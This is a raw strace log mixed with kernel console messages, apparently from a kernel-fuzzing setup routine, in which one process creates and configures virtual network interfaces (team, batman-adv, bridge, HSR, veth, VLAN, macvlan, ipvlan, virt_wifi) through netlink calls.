[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="team0", ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x10\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x61\x74\x61\x64\x76\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x61\x74\x61\x64\x76\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x61\x74\x61\x64\x76\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x61\x74\x61\x64\x76\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_0", ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv0", ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   76.055161][ T5086] team0: Port device team_slave_0 added
[   76.070526][ T5086] team0: Port device team_slave_1 added
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x14\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_1", ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv0", ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   76.106310][ T5086] batman_adv: batadv0: Adding interface: batadv_slave_0
[   76.114291][ T5086] batman_adv: batadv0: The MTU of interface batadv_slave_0 is too small (1500) to handle the transport of batman-adv packets. Packets going over this interface will be fragmented on layer2 which could impact the performance. Setting the MTU to 1560 would solve the problem.
[   76.141690][ T5086] batman_adv: batadv0: Not using interface batadv_slave_0 (retrying later): interface not active
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x14\x00\x00\x00"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x09\x00\x03\x00\x78\x66\x72\x6d\x30\x00\x00\x00\x18\x00\x12\x00\x08\x00\x01\x00\x78\x66\x72\x6d\x0c\x00\x02\x00\x08\x00\x02\x00\x01\x00\x00\x00"], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge_slave_0", ifr_ifindex=29}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="bridge_slave_1", ifr_ifindex=31}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x68\x73\x72\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x68\x73\x72"], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   76.163613][ T5086] batman_adv: batadv0: Adding interface: batadv_slave_1
[   76.170738][ T5086] batman_adv: batadv0: The MTU of interface batadv_slave_1 is too small (1500) to handle the transport of batman-adv packets. Packets going over this interface will be fragmented on layer2 which could impact the performance. Setting the MTU to 1560 would solve the problem.
[   76.196727][ T5086] batman_adv: batadv0: Not using interface batadv_slave_1 (retrying later): interface not active
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x68\x73\x72\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x68\x73\x72"], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr_slave_0", ifr_ifindex=46}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr_slave_1", ifr_ifindex=48}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=72, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x03\x00\x68\x73\x72\x30\x20\x00\x12\x00\x07\x00\x01\x00\x68\x73\x72\x00\x14\x00\x02\x00\x08\x00\x01\x00\x2e\x00\x00\x00\x08\x00\x02\x00\x30\x00\x00\x00"], 72, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 72
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=72, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr_slave_0", ifr_ifindex=46}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr_slave_1", ifr_ifindex=48}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_virt_wifi", ifr_ifindex=50}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=76, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x30\x00\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x76\x69\x72\x74\x5f\x77\x69\x66\x69\x00\x00\x00\x08\x00\x05\x00\x32\x00\x00\x00"], 76, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 76
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=76, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x76\x6c\x61\x6e\x00\x00\x34\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x28\x00\x02\x00\x24\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x76\x6c\x61\x6e\x00\x00"], 100, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 100
[   76.258965][ T5086] hsr_slave_0: entered promiscuous mode
[   76.265164][ T5086] hsr_slave_1: entered promiscuous mode
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=100, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x6c\x61\x6e\x30\x00\x00\x00\x20\x00\x12\x00\x08\x00\x01\x00\x76\x6c\x61\x6e\x14\x00\x02\x00\x06\x00\x01\x00\x00\x00\x00\x00\x06\x00\x05\x00\x81\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00"], 84, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 84
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x6c\x61\x6e\x31\x00\x00\x00\x20\x00\x12\x00\x08\x00\x01\x00\x76\x6c\x61\x6e\x14\x00\x02\x00\x06\x00\x01\x00\x01\x00\x00\x00\x06\x00\x05\x00\x88\xa8\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00"], 84, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 84
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=84, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_vlan", ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x6c\x61\x6e\x30\x1c\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x6c\x61\x6e\x00\x0c\x00\x02\x00\x08\x00\x01\x00\x04\x00\x00\x00\x08\x00\x05\x00\x35\x00\x00\x00"], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_vlan", ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x6c\x61\x6e\x31\x1c\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x6c\x61\x6e\x00\x0c\x00\x02\x00\x08\x00\x01\x00\x04\x00\x00\x00\x08\x00\x05\x00\x35\x00\x00\x00"], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x69\x70\x76\x6c\x61\x6e\x30\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x69\x70\x76\x6c\x61\x6e\x00\x00\x14\x00\x02\x00\x06\x00\x01\x00\x00\x00\x00\x00\x06\x00\x02\x00\x00\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00"], 88, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 88
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x69\x70\x76\x6c\x61\x6e\x31\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x69\x70\x76\x6c\x61\x6e\x00\x00\x14\x00\x02\x00\x06\x00\x01\x00\x02\x00\x00\x00\x06\x00\x02\x00\x02\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00"], 88, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 88
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x6d\x61\x63\x76\x74\x61\x70\x00\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x6d\x61\x63\x76\x74\x61\x70\x00\x00\x00"], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
